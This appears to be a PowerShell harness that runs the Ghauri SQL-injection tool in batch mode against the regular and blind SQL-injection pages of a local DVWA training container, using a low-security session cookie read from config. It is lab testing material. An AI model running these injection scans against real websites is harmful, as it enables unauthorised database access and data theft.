# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "dvwa"
$ghauri_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.ghauri))
$request1 = Join-Path $PSScriptRoot $config.targets.$target.request1
$request2 = Join-Path $PSScriptRoot $config.targets.$target.request2

$url_sqli = $config.environment.dvwa_docker + "/vulnerabilities/sqli/?id=1&Submit=Submit"
$url_blind = $config.environment.dvwa_docker + "/vulnerabilities/sqli_blind/?id=1&Submit=Submit"

$phpsessid = $config.targets.$target.phpsessid
$cookie_low = "security=low; PHPSESSID={0}" -f $phpsessid


# Low security sqli

& $ghauri_path -u "$url_sqli" --cookie="$cookie_low" --batch

# Low security sqli (blind)

& $ghauri_path -u "$url_blind" --cookie="$cookie_low" --batch